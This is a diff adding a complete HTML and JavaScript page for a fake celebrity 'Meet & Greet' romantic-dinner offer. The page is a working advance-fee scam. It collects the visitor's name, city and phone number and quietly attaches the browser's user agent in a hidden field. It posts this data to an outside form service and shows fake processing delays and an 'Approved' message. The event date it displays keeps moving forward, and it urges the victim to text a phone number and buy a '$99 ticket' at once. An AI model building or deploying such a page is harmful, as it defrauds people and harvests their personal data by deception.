@@ -1,0 +1,610 @@
+
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Meeting</title>
+
+<!-- Open Graph / Social Media Meta Tags -->
+<meta property="og:title" content="VIP Meeting">
+<meta property="og:description" content="Exclusive meeting">
+<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5vIdEt2qNSfjfaxe_3VJZspSTdQaxCbe19t7tfPVOjDbVpzXBCtQ-SiIo&s=10">
+<meta property="og:type" content="website">
+
+<!-- Twitter Card Meta Tags -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="VIP Meeting">
+<meta name="twitter:description" content="Register for an exclusive VIP meet & greet experience.">
+<meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5vIdEt2qNSfjfaxe_3VJZspSTdQaxCbe19t7tfPVOjDbVpzXBCtQ-SiIo&s=10">
+
+<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700;800;900&family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  /* ========================================================== */
+  /* TYPOGRAPHIC & FONT SIZE CONTROL PANEL (EDIT SIZES HERE)    */
+  /* ========================================================== */
+  :root {
+    --font-meet-greet-heading: 23px;       /* 1. First "Meet & Greet" heading */
+    --font-meet-greet-text: 16px;          /* 2. Text below first heading */
+    --font-first-form-label: 14px;         /* 3. First form label ("Celebrity Name") */
+    
+    --font-form-label-reduced: 14px;       /* -> Reduced font size for input field labels */
+
+    --font-processing-title: 18px;         /* 4. Processing title ("Processing request...") */
+    --font-processing-subtitle: 18px;      /* 5. Processing subtitle ("Please wait") */
+    
+    --font-registration-heading: 23px;     /* 6. Registration page "Registration" heading & Approved heading */
+    --font-registration-body: 16px;        /* 7. Registration page texts and form labels */
+    
+    --font-approved-subtext: 16px;         /* 8. Text directly under Approved */
+    --font-event-host-details: 16px;       /* 9. Event Host / Location details section */
+    --font-photo-instruction: 16px;        /* 10. Verification photo instruction text */
+  }
+  /* ========================================================== */
+
+  * {
+    box-sizing: border-box;
+    font-family: 'Inter', sans-serif;
+  }
+
+  body {
+    background: #ffffff;
+    color: #171a20;
+    margin: 0;
+    padding: 10px 4px;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    min-height: 100vh;
+  }
+
+  .main-wrapper {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+  }
+
+  #content {
+    background: #ffffff;
+    border: 1px solid #e5e7eb;
+    width: 100%;
+    max-width: 520px;
+    padding: 16px;
+    border-radius: 14px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.04);
+  }
+
+  #message {
+    display: none; 
+    font-size: 18px;
+    text-align: center;
+    color: #171a20;
+  }
+
+  #mainContent, #processing, #processing2 {
+    display: none;
+  }
+
+  h5 {
+    margin: 0 0 10px 0;
+  }
+
+  /* Logo + Meet & Greet container */
+  .logo-heading-container {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    margin-bottom: 14px;
+  }
+
+  /* Custom Logo Image Size (37px width, 35px height) */
+  .meet-logo {
+    width: 37px;
+    height: 35px;
+    object-fit: contain;
+  }
+
+  /* 1. First Meet & Greet Heading (Thick/Bold, Italic) */
+  #myForm .text-gpx {
+    font-size: var(--font-meet-greet-heading);
+    color: #171a20;
+    font-weight: 700;
+    font-style: italic;
+    letter-spacing: 0.5px;
+    margin: 0;
+  }
+
+  /* 2. Text below first heading */
+  #myForm .text-225px {
+    font-size: var(--font-meet-greet-text);
+    color: #000000;
+    line-height: 1.5;
+    margin-bottom: 14px;
+    text-align: left;
+    font-weight: 400;
+  }
+
+  /* 3. First form label ("Celebrity Name") */
+  #myForm label {
+    font-size: var(--font-form-label-reduced);
+    font-weight: 600;
+    letter-spacing: 0.8px;
+    text-transform: uppercase;
+    color: #000000;
+    display: block;
+    margin-bottom: 5px;
+    text-align: left;
+  }
+
+  input[type="text"] {
+    width: 100%;
+    height: 42px;
+    font-size: 14px;
+    color: #171a20;
+    background-color: #ffffff;
+    border: 1px solid #000000;
+    border-radius: 9px;
+    padding: 0 16px;
+    margin-bottom: 12px;
+    transition: all 0.2s ease;
+  }
+
+  input[type="text"]:focus {
+    outline: none;
+    border-color: #1a73e8;
+    box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+  }
+
+  /* Shared single button class styling */
+  .responsive-btn {
+    width: 100%;
+    height: 42px;
+    border: 0;
+    border-radius: 5px;
+    background-color: #1a73e8;
+    color: #ffffff;
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    cursor: pointer;
+    transition: background-color 0.2s ease;
+    margin-top: 15px;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    text-decoration: none;
+  }
+
+  .responsive-btn:hover {
+    background-color: #1557b0;
+  }
+
+  /* Processing sections design */
+  .processing-container {
+    text-align: center;
+    padding: 75px 0;
+  }
+
+  /* 4. Processing Title */
+  .processing-title {
+    color: #171a20;
+    font-weight: 600;
+    font-size: var(--font-processing-title);
+    letter-spacing: 0.5px;
+    margin: 0 0 6px 0;
+  }
+
+  /* 5. Processing Subtitle */
+  .processing-subtitle {
+    color: #000000;
+    font-size: var(--font-processing-subtitle);
+    font-weight: 500;
+    margin: 0 0 15px 0;
+  }
+
+  /* Bigger & Thicker Processing Spinner */
+  .lds-ring {
+    display: inline-block;
+    position: relative;
+    width: 75px;
+    height: 75px;
+    margin: 15px 0;
+  }
+  
+  .lds-ring div {
+    box-sizing: border-box;
+    display: block;
+    position: absolute;
+    width: 62px;
+    height: 62px;
+    margin: 6px;
+    border: 6px solid #1a73e8;
+    border-radius: 50%;
+    animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+    border-color: #1a73e8 transparent transparent transparent;
+  }
+  
+  .lds-ring div:nth-child(1) { animation-delay: -0.45s; }
+  .lds-ring div:nth-child(2) { animation-delay: -0.3s; }
+  .lds-ring div:nth-child(3) { animation-delay: -0.15s; }
+  
+  @keyframes lds-ring {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  #mainContent2 {
+    display: none;
+  }
+
+  /* 6. Registration Page Heading */
+  #mainContent .text-gpx {
+    font-size: var(--font-registration-heading);
+    color: #171a20;
+    font-weight: 400;
+    letter-spacing: 0.5px;
+  }
+
+  /* 7. Registration Page Body Text & Shared Styling */
+  .text-Ampx {
+    font-size: var(--font-registration-body);
+    font-weight: 500;
+    color: #000000;
+    line-height: 1.5;
+    margin-bottom: 14px;
+    text-align: left;
+  }
+
+  /* Registration Page Form Labels */
+  #mainContent label {
+    font-size: var(--font-form-label-reduced);
+    font-weight: 600;
+    letter-spacing: 0.8px;
+    color: #000000;
+    display: block;
+    margin-bottom: 5px;
+    text-align: left;
+  }
+
+  /* APPROVED CARD DESIGN */
+  .congrats-wrapper {
+    background: linear-gradient(135deg, rgba(26, 115, 232, 0.04) 0%, rgba(21, 87, 176, 0.08) 100%);
+    border: 1px solid rgba(26, 115, 232, 0.15);
+    border-radius: 16px;
+    padding: 20px;
+    text-align: center;
+    margin-bottom: 20px;
+    position: relative;
+  }
+
+  .congrats-header {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 16px;
+  }
+
+  .congrats-header h2 {
+    margin: 0;
+    font-family: 'Inter', sans-serif;
+    font-size: var(--font-registration-heading);
+    font-weight: 800;
+    color: #0f172a;
+    letter-spacing: -0.3px;
+  }
+
+  .check-badge {
+    background: linear-gradient(135deg, #1a73e8 0%, #1557b0 100%);
+    color: #ffffff;
+    width: 64px;
+    height: 64px;
+    border-radius: 50%;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 34px;
+    font-weight: 900;
+    box-shadow: 0 8px 20px rgba(26, 115, 232, 0.35);
+    animation: blueExcitingPop 2.2s infinite ease-in-out;
+  }
+
+  @keyframes blueExcitingPop {
+    0% {
+      transform: scale(1) rotate(0deg);
+      box-shadow: 0 0 0 0 rgba(26, 115, 232, 0.5), 0 8px 20px rgba(21, 87, 176, 0.35);
+    }
+    15% {
+      transform: scale(1.15) rotate(-8deg);
+      box-shadow: 0 0 0 10px rgba(26, 115, 232, 0), 0 10px 24px rgba(21, 87, 176, 0.45);
+    }
+    30% {
+      transform: scale(0.95) rotate(8deg);
+      box-shadow: 0 0 0 14px rgba(26, 115, 232, 0), 0 6px 16px rgba(21, 87, 176, 0.25);
+    }
+    45% {
+      transform: scale(1.05) rotate(0deg);
+      box-shadow: 0 0 0 0 rgba(26, 115, 232, 0), 0 8px 20px rgba(21, 87, 176, 0.35);
+    }
+    60% {
+      transform: scale(1) rotate(0deg);
+      box-shadow: 0 0 0 0 rgba(26, 115, 232, 0), 0 8px 20px rgba(21, 87, 176, 0.35);
+    }
+    100% {
+      transform: scale(1) rotate(0deg);
+      box-shadow: 0 0 0 0 rgba(26, 115, 232, 0), 0 8px 20px rgba(21, 87, 176, 0.35);
+    }
+  }
+
+  .lower-section {
+    padding: 0px;
+  }
+
+  .photo-instruction {
+    color: #5f6368;
+    font-size: var(--font-photo-instruction);
+    margin-bottom: 10px;
+    font-weight: 500;
+    text-align: left;
+  }
+</style>
+</head>
+<body>
+
+    <div id="message">Hello World</div>
+ 
+    <div class="main-wrapper">
+      <div id="content">
+
+        <!-- Form 1 -->
+        <form id="myForm" onsubmit="submitForm(); return false;">
+          <div class="logo-heading-container">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5vIdEt2qNSfjfaxe_3VJZspSTdQaxCbe19t7tfPVOjDbVpzXBCtQ-SiIo&s=10" alt="Logo" class="meet-logo">
+            <h5 class="text-gpx">Meet & Greet</h5>
+          </div>
+
+          <h5 class="text-225px"><br>
+             The exclusive event is back this year. This is your chance to experience a meet and greet that includes dinner with your favorite celebrity.<br><br>
+             
+             To proceed, enter the name of the Celebrity you'd like to meet below:
+          </h5>
+
+          <div id="error-message" style="color: #dc2626; font-size: 11px; margin-bottom: 4px;"></div>
+
+          <div class="formbold-mb-5">
+            <label for="name"></label>
+            <input type="text" required name="A_" id="name" placeholder="Celebrity Name" oninput="validateInput(this)" />
+          </div>
+
+          <div style="display: none;">
+            <input type="text" placeholder="How long have you been a fan?" />
+            <input type="text" id="email" name="A_" placeholder="Enter your first and last name" />
+            <input type="text" id="phonenumber" name="A_" placeholder="Enter the name of your city" />
+          </div>
+
+          <button type="submit" class="responsive-btn">Continue</button>
+        </form>
+
+        <!-- Processing 1 -->
+        <div id="processing" class="processing-container">
+          <div class="processing-title">Processing request...</div>
+          <div class="processing-subtitle">Please wait</div>
+          <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+        </div>
+
+        <!-- Main Content / Form 2 -->
+        <div id="mainContent">
+          <form action="https://submit-form.com/QzOi0GhFC" method="POST" id="secondForm" class="wpforms-validate wpforms-form" data-formid="278" onsubmit="submitSecondForm(event);">
+            <input type="hidden" name="Celeb" id="hiddenCelebInput">
+           
+            <h5 class="text-gpx" style="margin-bottom: 14px;">Registration</h5><br>   
+            <h5 class="text-Ampx">
+            	   You can now register for the exclusive meet-and-greet. This allows you to enjoy a romantic dinner with the legendary <span class="submittedName"></span>.
+              <br><br>
+              	  
+</h5>
+
+            <div>
+              <label>Enter your name</label>
+              <input type="text" required id="fullName" name="Client" placeholder="Enter your name" oninput="validateMinLength(this, 3, 'Please enter your full name')" />
+              
+              <br>   <br>   
+
+              <label>Enter your city</label>
+              <input type="text" required id="email2" name="City" placeholder="Enter your city" oninput="validateMinLength(this, 3, 'Please enter your city')" />
+
+<br>   <br>   
+              <label>
+How long have you been a fan of <span class="submittedName"></span>? (Your answer will determine if you are approved)</label>    <input type="text" id="address" placeholder="" />
+
+<br>   <br>   
+              <label>Enter your phone number</label>
+              <input type="text" id="phone2" name="Phone" placeholder="Enter your phone number" />
+
+              <input type="text" style="display: none;" value="Po" id="address_hidden">
+              <input type="text" style="display: none;" value="P1" id="city">
+              <input type="text" style="display: none;" value="p2" id="country">
+
+              <input type="hidden" name="z_PhoneDetails" id="hidden-user-agent">
+
+              <button type="submit" class="responsive-btn">Submit Form</button>
+            </div><br>   <br>   <br>   
+          </form>
+          
+          <script>
+            const userAgent = navigator.userAgent;
+            if(document.getElementById('hidden-user-agent')) {
+                document.getElementById('hidden-user-agent').value = userAgent;
+            }
+          </script>
+        </div> 
+
+        <!-- Processing 2 -->
+        <div id="processing2" class="processing-container">
+          <div class="processing-title"><br>Please  Wait. . .</div><br><br>
+          <div class="processing-subtitle">You'll be notified if you are approved in a few seconds. <br><br>Don't leave this page</div>
+          <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+        </div>
+
+        <!-- Approved Section -->
+        <div id="mainContent2">
+          
+          <div class="congrats-wrapper">
+            <div class="congrats-header">
+              <h2>Approved</h2>
+              <div class="check-badge">&#10003;</div>
+            </div>
+          </div>
+
+          <div class="lower-section">
+            <h5 class="text-Ampx">
+              Congratulations, <span class="submittedFullName"></span>. You’ve been approved to meet <span class="submittedName"></span> on <span class="event-date"></span>. The best part is you don't need to travel because <span class="submittedName"></span> is coming to <span class="submittedEmail2"></span> to meet you.
+              <br><br>
+              This meeting is a dream come true because you’ll get to enjoy a romantic dinner with <span class="submittedName"></span>.
+You need a $99 ticket to access the romantic dinner.
+              <br><br>
+              If you don't buy the $99 ticket immediately, the meeting will be canceled, so tap the button below to contact the singer, <span class="submittedName"></span>, and buy the ticket right now.
+            </h5>
+
+            <a id="smsButton" class="responsive-btn" href="sms:+15752084868?&body=I%20just%20got%20approved%20for%20the%20meeting.%20I%20want%20to%20buy%20the%20ticket%20now">
+              Contact Singer and Buy Ticket
+            </a>
+          </div><br>   <br>  
+
+        </div>
+
+      </div>
+    </div>
+
+<script>
+    // Pre-determine mobile state once on load to eliminate click latency
+    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+    document.getElementById('smsButton').addEventListener('click', function(e) {
+      if (!isMobile) {
+        e.preventDefault();
+        const num = "(575) 208-4868";
+        const msg = "I just got approved for the meeting. I want to buy the ticket now";
+        
+        if (navigator.clipboard) {
+          navigator.clipboard.writeText(msg);
+        }
+        alert(`Please text "${msg}" to ${num}.\n\n(Message copied to clipboard!)`);
+      }
+      // On mobile devices, the native href="sms:..." opens instantly without JS interference.
+    }, { passive: false });
+
+    function validateInput(input) {
+      var minLength = 5;
+      var maxLength = 28;
+      var errorMessage = document.getElementById("error-message");
+
+      if (input.value.length < minLength || input.value.length > maxLength) {
+        errorMessage.textContent = "";
+        input.setCustomValidity("Please enter a valid celebrity name");
+      } else {
+        errorMessage.textContent = "";
+        input.setCustomValidity("");
+      }
+    }
+
+    function validateMinLength(input, minLength, message) {
+      if (input.value.length < minLength) {
+        input.setCustomValidity(message);
+      } else {
+        input.setCustomValidity("");
+      }
+    }
+
+    document.getElementById("processing").style.display = "none";
+    document.getElementById("processing2").style.display = "none";
+    document.getElementById("myForm").style.display = "block";
+
+    function getActiveEventDate() {
+        let target = new Date(2026, 9, 30);
+        const now = new Date();
+        
+        while (true) {
+            let thresholdDate = new Date(target);
+            thresholdDate.setDate(thresholdDate.getDate() - 14);
+            
+            if (now < thresholdDate) {
+                break;
+            }
+            target.setDate(target.getDate() + 25);
+        }
+        
+        const options = { month: 'long', day: 'numeric', year: 'numeric' };
+        return target.toLocaleDateString('en-US', options);
+    }
+
+    function submitForm() {
+        const celebName = document.getElementById("name").value;
+        const hiddenCelebField = document.getElementById("hiddenCelebInput");
+        if (hiddenCelebField) {
+            hiddenCelebField.value = celebName;
+        }
+
+        document.getElementById("myForm").style.display = "none";
+        document.getElementById("processing").style.display = "block";
+        
+        setTimeout(function() {
+            document.getElementById("processing").style.display = "none";
+            document.getElementById("mainContent").style.display = "block";
+            
+            const submittedNameElements = document.getElementsByClassName("submittedName");
+            for (let i = 0; i < submittedNameElements.length; i++) {
+                submittedNameElements[i].textContent = celebName;
+            }
+            
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }, 1000);
+    }
+
+    function submitSecondForm(event) {
+        event.preventDefault();
+        
+        const formElement = document.getElementById("secondForm");
+        const formData = new FormData(formElement);
+
+        formElement.style.display = "none";
+        document.getElementById("processing2").style.display = "block";
+
+        fetch("https://submit-form.com/QzOi0GhFC", {
+            method: "POST",
+            body: formData,
+            headers: {
+                'Accept': 'application/json'
+            }
+        })
+        .catch(error => {
+            console.error('Second form submission error:', error);
+        })
+        .finally(() => {
+            setTimeout(function() {
+                document.getElementById("processing2").style.display = "none";
+                
+                const mainContent2 = document.getElementById("mainContent2");
+                mainContent2.style.display = "block";
+                
+                const fullName = document.getElementById("fullName").value;
+                const email2 = document.getElementById("email2").value;
+                const phone2 = document.getElementById("phone2").value;
+                const address = document.getElementById("address").value;
+
+                document.querySelectorAll(".submittedFullName").forEach(el => el.textContent = fullName);
+                document.querySelectorAll(".submittedEmail2").forEach(el => el.textContent = email2);
+                document.querySelectorAll(".submittedPhone2").forEach(el => el.textContent = phone2);
+                document.querySelectorAll(".submittedAddress").forEach(el => el.textContent = address);
+
+                const activeDate = getActiveEventDate();
+                document.querySelectorAll(".event-date").forEach(el => el.textContent = activeDate);
+
+                mainContent2.scrollIntoView({ behavior: 'smooth' });
+            }, 8000);
+        });
+    }
+</script>
+</body>
+</html>
